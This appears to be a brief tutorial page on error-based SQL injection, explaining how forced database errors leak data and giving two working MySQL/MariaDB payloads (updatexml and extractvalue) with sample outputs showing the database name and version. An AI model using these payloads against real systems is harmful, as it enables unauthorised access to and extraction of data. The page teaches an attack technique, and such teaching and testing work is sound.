# Page 2

## Error-Based SQL injection

Error-based SQL injection attack is an **In-band injection** technique where we **utilize the error output** from the database to manipulate the data inside the database.

Error-Based SQL Injection technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.

{% hint style="info" %}
Key: “When life gives you a lemon, make a lemonade.”

In Simple words: Use the thrown error, to precisely craft the next payload.
{% endhint %}

```sql
?id=1' and updatexml('anything',concat(':',(select database()),':'),null )-- -

OUTPUT:
XPATH syntax error: ':security:'
```

```sql
?id=1' AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))-- -

OUTPUT:
XPATH syntax error: '~10.1.19-MariaDB~'
```



##
